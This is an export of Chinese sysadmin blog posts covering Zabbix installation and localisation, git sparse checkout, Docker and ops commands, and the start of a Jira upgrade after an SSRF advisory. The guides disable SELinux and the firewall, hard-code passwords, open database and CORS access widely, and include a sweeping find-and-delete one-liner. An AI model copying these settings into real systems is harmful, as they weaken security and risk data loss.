<h4 id="本机监控"><a href="#本机监控" class="headerlink" title="本机监控"></a>本机监控</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install zabbix-agent</span><br><span class="line">sudo service zabbix-agent restart</span><br></pre></td></tr></table></figure>

<h4 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/zabbix</span><br></pre></td></tr></table></figure>

<p>缺省的账户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Username = admin</span><br><span class="line">Password = zabbix</span><br></pre></td></tr></table></figure>

<h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install zabbix-agent</span><br></pre></td></tr></table></figure>

<p>修改配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/zabbix/zabbix_agentd.conf</span><br></pre></td></tr></table></figure>

<p>调整项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server=127.0.0.1 #修改为 zabbix server 服务器的IP，如果有网关或被监控机为虚拟机也加上母机的IP</span><br><span class="line">ServerActive=127.0.0.1 #修改为 zabbix server 服务器的IP</span><br><span class="line">Hostname=Zabbix server #修改为网页里面添加的Hostname，需要保持一致。</span><br></pre></td></tr></table></figure>

<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p><strong>中文显示</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install language-pack-zh-hans</span><br></pre></td></tr></table></figure>

<p><a href="http://www.ttlsa.com/monitor/zabbix/" target="_blank" rel="noopener">zabbix</a>是一个多语言监控系统，默认使用英文并且也支持中文语言，详见《<a href="http://www.ttlsa.com/zabbix/zabbix-convert-into-chinese-8-ttlsa/" target="_blank" rel="noopener">zabbix汉化方法</a>》，但是近期有人反映说zabbix里面看不到中文语言.请往下看</p>
<p><strong>zabbix不支持中文图</strong></p>
<p><img src="/articles/aeb6452a/1.png" alt="Linux"></p>
<p><strong>开启zabbix对中文的支持</strong></p>
<p>原来zabbix默认把对中文的支持给关闭了，我们需要修改zabbix的<a href="http://www.ttlsa.com/php/" target="_blank" rel="noopener">php</a>源文件. 修改站点根目录下include/locales.inc.php文件.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim include/locales.inc.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getLocales</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> array(</span><br><span class="line">                <span class="string">'en_GB'</span> =&gt; array(<span class="string">'name'</span> =&gt; _(<span class="string">'English (en_GB)'</span>),        <span class="string">'display'</span> =&gt; <span class="literal">true</span>),</span><br><span class="line">                <span class="string">'en_US'</span> =&gt; array(<span class="string">'name'</span> =&gt; _(<span class="string">'English (en_US)'</span>),        <span class="string">'display'</span> =&gt; <span class="literal">true</span>),</span><br><span class="line">                <span class="string">'bg_BG'</span> =&gt; array(<span class="string">'name'</span> =&gt; _(<span class="string">'Bulgarian (bg_BG)'</span>),      <span class="string">'display'</span> =&gt; <span class="literal">true</span>),</span><br><span class="line">                <span class="string">'zh_CN'</span> =&gt; array(<span class="string">'name'</span> =&gt; _(<span class="string">'Chinese (zh_CN)'</span>),        <span class="string">'display'</span> =&gt; <span class="literal">true</span>),</span><br><span class="line">                //原本这里为<span class="literal">false</span>,请改为<span class="literal">true</span></span><br><span class="line">                ...........代码省略掉........</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>中文乱码</strong></p>
<p>1、历史记录处出现 ???? 乱码：</p>
<p><img src="/articles/aeb6452a/2.png" alt="img"></p>
<p>出现原因：</p>
<p>mysql数据库默认字符集为 latin1，而 zabbix 需要使用 utf8，在初始化创建 zabbix 库时没有指定具体的字符集，倒入三张表时会继承 Mysql 的默认字符集，所以此处会出现乱码；</p>
<p><img src="/articles/aeb6452a/3.png" alt="img"></p>
<p>解决办法：</p>
<p>1、将 zabbix 数据库中的表备份；</p>
<p>2、手动删除 zabbix 数据库；</p>
<p>3、重新创建 zabbix 库时手动指定字符集为 utf8；</p>
<p>4、将倒出的 sql 文件中字符集为latin1的表字符集替换为 utf8；</p>
<p>5、将备份的zabbix库重新倒入即可；</p>
<p><img src="/articles/aeb6452a/4.png" alt="img"></p>
<p><img src="/articles/aeb6452a/5.png" alt="img"></p>
<p><img src="/articles/aeb6452a/6.png" alt="img"></p>
<p><img src="/articles/aeb6452a/7.png" alt="img"></p>
<p><img src="/articles/aeb6452a/8.png" alt="img"></p>
<p><img src="/articles/aeb6452a/9.png" alt="img"></p>
<p>此时重新访问 zabbix web页面，点击几次菜单，历史记录处一切正常；</p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>git拉取项目下单个目录</title>
    <url>/articles/25be17f8.html</url>
    <content><![CDATA[<p>有时git库里的东西比较多，我们只希望像SVN一样，只拉取git库的一个目录。</p>
<p>例如：基础代码仓库infra-code_ops有很多基础代码，我们只想拉取仓库里nginx-conf目录的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init infra-code_ops-nginx &amp;&amp; <span class="built_in">cd</span>  infra-code_ops-nginx          //初始化仓库,并进入该目录</span><br><span class="line">$ git remote add -f origin http:``//gitlab.xxx.com/ops/infra-code_ops.git   //添加远程仓库地址</span><br><span class="line">$ git config core.sparsecheckout ``<span class="literal">true</span>    //开启sparse checkout功能</span><br><span class="line">$ <span class="built_in">echo</span> ``<span class="string">"nginx-conf/"</span>` `&gt;&gt; .git/info/sparse-checkout   //将nginx-conf/目录写入到该文件中</span><br><span class="line">$ cat .git/info/sparse-checkout   //确认查看该文件内容</span><br><span class="line">$ git pull origin master    //拉取远程master分支</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>运维技术</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker知识点</title>
    <url>/articles/1e48ce52.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>运维日常工作中常见服务的docker快速安装汇总。</p>
<p>cadvisor docker监控</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run —cpu-period=100000 —cpu-quota=100000 -m 1g --volume=/:/rootfs:ro --volume=/var/run:/var/run:rw --volume=/sys:/sys:ro --volume=/var/lib/docker/:/var/lib/docker:ro --publish=9999:8080 --name=cadvisor google/cadvisor -storage_driver=influxdb -storage_driver_db=cadvisor -storage_driver_host=172.18.203.15:8086 -storage_driver_user=cadvisor -storage_driver_password=cadvisor</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>启动postgresql容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run pgsql -p 0.0.0.0:5432:5432 -e POSTGRES_PASSWORD=jftest123 -v /data/postgres:/var/lib/postgresql/data -d postgres</span><br></pre></td></tr></table></figure>

<p>启动rocketmq namesrv 容器 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name rmq-namesrv \</span><br><span class="line">--net=host \</span><br><span class="line">-v $PWD/test/namesrv/logs:/opt/logs \</span><br><span class="line">-v $PWD/test/namesrv/store:/opt/store \</span><br><span class="line">-d registry-nexus.jr.qa.ly.com:10013/rocketmq-namesrv:4.2.0</span><br></pre></td></tr></table></figure>

<p>启动rocketmq broker 容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name rmq-broker \</span><br><span class="line">--net=host \</span><br><span class="line">-v $PWD/test/broker/logs:/opt/logs \</span><br><span class="line">-v $PWD/test/broker/store:/opt/store \</span><br><span class="line">-v $PWD/test/broker/conf:/opt/conf \</span><br><span class="line">-d registry-nexus.jr.qa.ly.com:10013/rocketmq-broker:4.2.0 sh /opt/rocketmq-4.2.0/bin/mqbroker -c /opt/conf/broker.properties</span><br></pre></td></tr></table></figure>

<p>过滤ip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -E -o &quot;172.18.[0-9]&#123;1,3&#125;[\.][0-9]&#123;1,3&#125;&quot; filename</span><br></pre></td></tr></table></figure>

<p>linux删除乱码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . ! -regex &apos;.*\.jar\|.*\.war\|.*\.zip&apos;|xargs rm</span><br></pre></td></tr></table></figure>

<p>ansible命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ansible rabbitmq -m shell -a &quot;cp /etc/haproxy/haproxy.cfg /etc/haproxy/haproxy.20180315&quot;</span><br><span class="line">ansible rabbitmq -m shell -a &quot;mv /etc/haproxy/template.cfg.bak /etc/haproxy/haproxy.bak&quot;</span><br><span class="line">ansible rabbitmq -m shell -a &quot;mv /etc/haproxy/template.cfg /etc/haproxy/haproxy.cfg&quot;</span><br><span class="line">ansibel rabbitmq -m shell -a &quot;/etc/init.d/haproxy restart&quot;</span><br></pre></td></tr></table></figure>

<p>inluxdb保留策略</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW RETENTION POLICIES ON cadvisor</span><br><span class="line">CREATE RETENTION POLICY &quot;15_days&quot; ON &quot;cadvisor&quot; DURATION 15d REPLICATION 1 DEFAULT</span><br><span class="line">drop retention POLICY &quot;15_days&quot; ON &quot;cadvisor&quot;</span><br></pre></td></tr></table></figure>

<p>elasticsearch</p>
<p>标准配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cluster.name: sunelk</span><br><span class="line">node.name: node-195</span><br><span class="line">path.data: /home/es/elasticsearch/data/</span><br><span class="line">path.logs: /home/es/elasticsearch/logs/</span><br><span class="line"></span><br><span class="line">bootstrap.memory_lock: false</span><br><span class="line">bootstrap.system_call_filter: false</span><br><span class="line"></span><br><span class="line">node.master: true   </span><br><span class="line">node.data: false   </span><br><span class="line">node.ingest: false   </span><br><span class="line">search.remote.connect: false </span><br><span class="line"></span><br><span class="line">network.host: 0.0.0.0  </span><br><span class="line"></span><br><span class="line">http.port: 9200</span><br><span class="line"></span><br><span class="line">discovery.zen.ping.unicast.hosts: [&quot;10.10.0.193&quot;, &quot;10.10.0.194&quot;,&quot;10.10.0.195&quot;]     </span><br><span class="line">                                                                        </span><br><span class="line">discovery.zen.minimum_master_nodes: 2 </span><br><span class="line">      </span><br><span class="line">http.cors.enabled: true                                                                                                                                                                                                   </span><br><span class="line">http.cors.allow-origin: &quot;*&quot;</span><br></pre></td></tr></table></figure>

<p>验证</p>
<p><a href="http://10.10.0.195:9200/_cat/nodes?v" target="_blank" rel="noopener">http://10.10.0.195:9200/_cat/nodes?v</a></p>
<p><a href="http://10.10.0.195:9200/_cluster/health" target="_blank" rel="noopener">http://10.10.0.195:9200/_cluster/health</a></p>
<p>集群健康状况</p>
<p>curl ‘192.168.77.128:9200/_cluster/health?pretty’</p>
<p>集群详细情况</p>
<p>curl ‘192.168.77.128:9200/_cluster/state?pretty’</p>
]]></content>
      <categories>
        <category>容器化</category>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7 yum安装zabbix4.0长期稳定版及优化</title>
    <url>/articles/4140dae2.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>zabbix监控系统是目前企业常用的监控系统之一。具有快速上手，监控简单明了等特点。通过本文教程快速安装zabbix4.0 LST监控系统，为企业搭建监控系统，保驾护航。</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>centos7.x</p>
<p>zabbix4.0.x  LST</p>
<h2 id="参考文档和下载地址"><a href="#参考文档和下载地址" class="headerlink" title="参考文档和下载地址"></a>参考文档和下载地址</h2><p><a href="https://www.zabbix.com/documentation/4.0/zh/manual" target="_blank" rel="noopener">官方文档</a></p>
<p><a href="http://repo.zabbix.com/zabbix/4.0/rhel/7/x86_64/" target="_blank" rel="noopener">下载地址</a></p>
<a id="more"></a>



<h2 id="环境确认"><a href="#环境确认" class="headerlink" title="环境确认"></a>环境确认</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /etc/redhat-release <span class="comment">#  查看CentOS版本 </span></span><br><span class="line">cat /proc/version         <span class="comment">#查看存放与内核相关的文件</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/1.png" alt></p>
<h2 id="搭建之前的操作"><a href="#搭建之前的操作" class="headerlink" title="搭建之前的操作"></a><strong>搭建之前的操作</strong></h2><h4 id="升级系统组件到最新的版本"><a href="#升级系统组件到最新的版本" class="headerlink" title="升级系统组件到最新的版本"></a><strong>升级系统组件到最新的版本</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/2.png" alt></p>
<h4 id="关闭selinux"><a href="#关闭selinux" class="headerlink" title="关闭selinux"></a><strong>关闭selinux</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/selinux/config    <span class="comment">#将SELINUX=enforcing改为SELINUX=disabled 设置后需要重启才能生效</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/3.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setenforce 0       <span class="comment">#临时关闭命令</span></span><br><span class="line">getenforce         <span class="comment">#检测selinux是否关闭，Disabled 为关闭</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/4.png" alt></p>
<h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a><strong>关闭防火墙</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">firewall-cmd --state    <span class="comment">#查看默认防火墙状态，关闭后显示not running，开启后显示running</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/5.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service    <span class="comment">#临时关闭firewall</span></span><br><span class="line">systemctl <span class="built_in">disable</span> firewalld.service <span class="comment">#禁止firewall开机启动</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/6.png" alt></p>
<h2 id="搭建LAMP环境"><a href="#搭建LAMP环境" class="headerlink" title="搭建LAMP环境"></a><strong>搭建LAMP环境</strong></h2><h4 id="安装所需所有软体仓库"><a href="#安装所需所有软体仓库" class="headerlink" title="安装所需所有软体仓库"></a><strong>安装所需所有软体仓库</strong></h4><p>Zabbix是建立在LAMP或者LNMP环境之上，在此为了方便就使用yum安装LAMP环境.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y httpd mariadb-server mariadb php php-mysql php-gd libjpeg* php-ldap php-odbc php-pear php-xml php-xmlrpc php-mhash</span><br><span class="line"></span><br><span class="line">rpm -qa httpd php mariadb            <span class="comment">#安装完成后检查应用版本</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/7.png" alt></p>
<p><img src="/articles/4140dae2/8.png" alt></p>
<h4 id="编辑httpd"><a href="#编辑httpd" class="headerlink" title="编辑httpd"></a><strong>编辑httpd</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line">ServerName www.zabbixyk.com      <span class="comment">#修改为主机名</span></span><br><span class="line">DirectoryIndex index.html index.php   <span class="comment"># 添加首页支持格式</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/9.png" alt></p>
<h4 id="编辑配置php，配置中国时区"><a href="#编辑配置php，配置中国时区" class="headerlink" title="编辑配置php，配置中国时区"></a><strong>编辑配置php，配置中国时区</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/php.ini</span><br><span class="line"></span><br><span class="line">date.timezone = Asia/Shanghai   <span class="comment"># 配置时区</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/10.png" alt></p>
<h4 id="启动httpd和mysqld服务"><a href="#启动httpd和mysqld服务" class="headerlink" title="启动httpd和mysqld服务"></a><strong>启动httpd和mysqld服务</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start httpd   <span class="comment">#启动并加入开机自启动httpd</span></span><br><span class="line">systemctl <span class="built_in">enable</span> httpd</span><br><span class="line">systemctl start mariadb  <span class="comment">#启动并加入开机自启动mysqld</span></span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb</span><br><span class="line"></span><br><span class="line">ss -anplt | grep httpd   <span class="comment">#查看httpd启动情况，80端口监控表示httpd已启动</span></span><br><span class="line">ss -naplt | grep mysqld  <span class="comment">#查看mysqld启动情况，3306端口监控表示mysqld已启动</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/11.png" alt></p>
<p><img src="/articles/4140dae2/12.png" alt></p>
<p><img src="/articles/4140dae2/13.png" alt></p>
<h4 id="创建一个测试页"><a href="#创建一个测试页" class="headerlink" title="创建一个测试页"></a><strong>创建一个测试页</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /var/www/html/index.php <span class="comment">#创建一个测试页，并编辑</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/14.png" alt></p>
<p><img src="/articles/4140dae2/15.png" alt></p>
<h4 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://127.0.0.1 -I         <span class="comment">#本地测试</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/16.png" alt></p>
<h4 id="配置mysql和权限"><a href="#配置mysql和权限" class="headerlink" title="配置mysql和权限"></a><strong>配置mysql和权限</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysqladmin -u root password ykadmin123           <span class="comment">#设置数据库root密码</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/17.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p        <span class="comment">#root用户登陆数据库</span></span><br><span class="line">CREATE DATABASE zabbix character <span class="built_in">set</span> utf8 collate utf8_bin;       <span class="comment">#创建zabbix数据库（中文编码格式）</span></span><br><span class="line">GRANT all ON zabbix.* TO <span class="string">'zabbix'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'ykadmin123'</span>;  <span class="comment">#授予zabbix用户zabbix数据库的所有权限，密码ykadmin123</span></span><br><span class="line">flush privileges;    <span class="comment">#刷新权限</span></span><br><span class="line">quit                 <span class="comment">#退出数据库</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/18.png" alt></p>
<p>为保证zabbix用户也可以登录数据库，若出现本地无法登录情况，解决方式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p  <span class="comment">#使用root账户登录数据库；</span></span><br><span class="line">select user,host from mysql.user;   <span class="comment">#有空用户名称占用导致本地无法登录远程可登录</span></span><br><span class="line">drop user <span class="string">''</span>@localhost;  <span class="comment">#删除空用户</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/19.png" alt></p>
<h2 id="安装zabbix"><a href="#安装zabbix" class="headerlink" title="安装zabbix"></a>安装zabbix</h2><h4 id="安装依赖包-组件"><a href="#安装依赖包-组件" class="headerlink" title="安装依赖包 + 组件"></a><strong>安装依赖包 + 组件</strong></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install net-snmp net-snmp-devel curl curl-devel libxml2 libxml2-devel libevent-devel.x86_64 javacc.noarch  javacc-javadoc.noarch javacc-maven-plugin.noarch javacc*</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/20.png" alt></p>
<h4 id="安装zabbix-server，并初始化库"><a href="#安装zabbix-server，并初始化库" class="headerlink" title="安装zabbix-server，并初始化库"></a>安装zabbix-server，并初始化库</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install php-bcmath php-mbstring -y <span class="comment">#安装php支持zabbix组件</span></span><br><span class="line"> </span><br><span class="line">rpm -ivh http://repo.zabbix.com/zabbix/4.0/rhel/7/x86_64/zabbix-release-4.0-1.el7.noarch.rpm  <span class="comment">#会自动生成yum源文件，保证系统可以上网</span></span><br><span class="line"> </span><br><span class="line">yum install zabbix-server-mysql zabbix-web-mysql -y    <span class="comment">#安装zabbix组件</span></span><br><span class="line"> </span><br><span class="line">zcat /usr/share/doc/zabbix-server-mysql-4.0.0/create.sql.gz | mysql -uzabbix -p -h 172.18.20.224 zabbix   <span class="comment">#导入数据到数据库zabbix中(最后一个zabbix是数据库zabbix)，且因为用户zabbix是%(任意主机)，所以登录时需要加上当前主机ip(-h 172.18.20.224),密码是用户zabbix登陆密码ykadmin123</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/21.png" alt></p>
<p><img src="/articles/4140dae2/22.png" alt></p>
<p><img src="/articles/4140dae2/23.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi  /etc/zabbix/zabbix_server.conf   <span class="comment">#配置数据库用户及密码</span></span><br><span class="line">grep -n <span class="string">'^'</span>[a-Z] /etc/zabbix/zabbix_server.conf   <span class="comment">#确认数据库用户及密码</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/24.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/httpd/conf.d/zabbix.conf     //修改时区</span><br><span class="line"></span><br><span class="line">将<span class="comment"># php_value date.timezone Europe/Riga 变更成php_value date.timezone Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> zabbix-server <span class="comment"># #启动并加入开机自启动zabbix-server</span></span><br><span class="line">systemctl start zabbix-server</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/25.png" alt></p>
<p><img src="/articles/4140dae2/26.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -anpt | grep zabbix      //监听在10051端口上,如果没监听成功，可重启zabbix-server服务试试</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/27.png" alt></p>
<p>建议重启服务器，再继续。</p>
<h4 id="web界面安装zabbix"><a href="#web界面安装zabbix" class="headerlink" title="web界面安装zabbix"></a><strong>web界面安装zabbix</strong></h4><p>如果以上步骤无误，现在可以使用web打开  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://172.18.20.224/zabbix　　//注意这里IE浏览器打不开，本次测试使用chrome浏览器</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/28.png" alt></p>
<p><img src="/articles/4140dae2/29.png" alt></p>
<p><img src="/articles/4140dae2/30.png" alt></p>
<p><img src="/articles/4140dae2/31.png" alt></p>
<p><img src="/articles/4140dae2/32.png" alt></p>
<p><img src="/articles/4140dae2/33.png" alt></p>
<p><img src="/articles/4140dae2/34.png" alt></p>
<p><img src="/articles/4140dae2/35.png" alt></p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h4 id="安装graphtree"><a href="#安装graphtree" class="headerlink" title="安装graphtree"></a>安装graphtree</h4><p>graphtree的功能</p>
<blockquote>
<p>1)集中展示所有分组设备 </p>
<p>2)集中展示一个分组图像 </p>
<p>3)集中展示一个设备图像 </p>
<p>4)展示设备下的Application </p>
<p>5)展示每个Application下的图像</p>
<p> 6)展示每个Application下的日志 </p>
<p>7)对原生无图的监控项进行绘图 (注意问题:在组和主机级别，默认只显示<a href="https://www.2cto.com/os/" target="_blank" rel="noopener">系统</a>配置的graph)</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/zabbix</span><br><span class="line">wget https://raw.githubusercontent.com/OneOaaS/graphtrees/master/graphtree3.2.x.patch</span><br><span class="line">yum install -y patch</span><br><span class="line">patch -Np0 &lt; graphtree3.2.x.patch</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/36.png" alt></p>
<p><strong># 注意此处的权限，必须和nginx或者apache的用户一致，我用的是apache，则此处为chown -R apache:apache oneoaas</strong></p>
<p>graphtree的删除广告部分修改配置 进入graphtree配置文件，进行相关修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim oneoaas/templates/graphtree/graphtree.tpl</span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/37.png" alt></p>
<p>修改logo</p>
<p><img src="/articles/4140dae2/38.png" alt></p>
<p><img src="/articles/4140dae2/39.png" alt></p>
<p>重启httpd服务然后查看效果</p>
<p><strong>注意：遇到了个很大的坑，可能你反复修改后不能正常跳转，看到效果，清理缓存后，再重试。</strong></p>
<p><img src="/articles/4140dae2/40.png" alt></p>
<p><img src="/articles/4140dae2/41.png" alt></p>
<h4 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h4><p><img src="/articles/4140dae2/42.png" alt></p>
<h6 id="复制字体"><a href="#复制字体" class="headerlink" title="复制字体"></a>复制字体</h6><p>复制本地电脑C:\Windows\Fonts\simkai.ttf（楷体）上传到zabbix服务器网站目录的fonts目录下</p>
<p><img src="/articles/4140dae2/43.png" alt></p>
<p>yum或rpm安装的zabbix-server字体目录为：/usr/share/zabbix/assets/fonts</p>
<p><img src="/articles/4140dae2/44.png" alt></p>
<p>graphfont.ttf是zabbix默认字符集，simkai.ttf是从windows复制过来的字体文件，权限最好给777，要不会影响到zabbix图形显示异常。</p>
<h6 id="字体替换"><a href="#字体替换" class="headerlink" title="字体替换"></a>字体替换</h6><p>方法一：</p>
<p>修改此/usr/share/zabbix/include/defines.inc.php文件中字体的配置，将里面关于字体设置从graphfont都替换成simkai，注意:realpath的字体设置路径</p>
<p><img src="/articles/4140dae2/47.png" alt></p>
<p>方法二：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span>  /etc/alternatives/</span><br><span class="line">mv zabbix-web-font zabbix-web-font.bak   <span class="comment">#备份</span></span><br><span class="line">ln -sf /usr/share/zabbix/assets/fonts/simkai.ttf zabbix-web-font  <span class="comment">#新链接</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/4140dae2/45.png" alt></p>
<p>到页面刷新就可看到，如果没有更改，请重启zabbix-server</p>
<p><img src="/articles/4140dae2/46.png" alt></p>
]]></content>
      <categories>
        <category>监控技术</category>
        <category>Zabbix</category>
      </categories>
      <tags>
        <tag>Zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>jira低版本(7.4.1)发现漏洞升级到最新版本(8.4.1)</title>
    <url>/articles/ecacdd4f.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>早上到公司就接到总部信息安全组邮件。邮件内容是：Atlassian公开了一个Jira未授权SSRF漏洞。Jira的/plugins/servlet/gadgets/makeRequest资源存在SSRF漏洞，原因在于JiraWhitelist这个类的逻辑缺陷，成功利用此漏洞的远程攻击者可以以Jira服务端的身份访问内网资源。此漏洞无需任何凭据即可触发。</p>
<p><strong>影响范围</strong></p>
<p>版本小于8.4.0</p>
<p>漏洞详情链接： <a href="https://jira.atlassian.com/browse/JRASERVER-69793" target="_blank" rel="noopener">https://jira.atlassian.com/browse/JRASERVER-69793</a></p>
<p>基于以上情况，把在线上的jira 7.4.1版本升级为最新版本8.4.1，因为官方在8.4.0已经修复这个漏洞。</p>
<a id="more"></a>



<h2 id="程序目录"><a href="#程序目录" class="headerlink" title="程序目录"></a>程序目录</h2><ul>
<li>JIRA7.4.1安装目录(以下简称<strong>原目录</strong>): /opt/atlassian/jira-7.4.1-bak</li>
<li>JIRA7.4.1 HOME目录(以下简称<strong>原HOME</strong>): /var/atlassian/application-data/jira-7.4.1-bak</li>
<li>JIRA8.4.1安装目录(以下简称<strong>新目录</strong>): /opt/atlassian/jira</li>
<li>JIRA8.4.1 HOME目录(以下简称<strong>新HOME</strong>): /var/atlassian/application-data/jira</li>
</ul>
<h2 id="升级步骤"><a href="#升级步骤" class="headerlink" title="升级步骤"></a>升级步骤</h2><ul>
<li>注：本次升级是在同一服务器升级</li>
<li>JIRA7.4.1数据备份</li>
<li>JIRA8.4.1安装</li>
<li>备份数据导入JIRA8.4.1</li>
<li>后续</li>
</ul>
<h2 id="停止原JIRA服务"><a href="#停止原JIRA服务" class="headerlink" title="停止原JIRA服务"></a>停止原JIRA服务</h2><p>停止服务可以保证后续备份的干净。所以建议升级前先把服务停止。</p>
<ul>
<li><p>在<strong>原目录</strong>的bin文件夹下</p>
</li>
<li><p>执行 ./stop-jira.sh 停止JIRA服务</p>
</li>
</ul>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><h3 id="备份数据库内容"><a href="#备份数据库内容" class="headerlink" title="备份数据库内容"></a>备份数据库内容</h3><p>有两种方法备份数据库内容：<strong>本地数据库备份工具或JIRA的XML备份工具</strong></p>
<ul>
<li><strong>本地数据库备份工具</strong><ul>
<li>调用诸如mysqldump或pg_dump之类的命令行工具</li>
</ul>
</li>
<li><strong>JIRA的XML备份工具</strong><ul>
<li>选择系统–&gt;导入和导出–&gt;备份系统，在’文件名’字段中，输入备份文件的名称。</li>
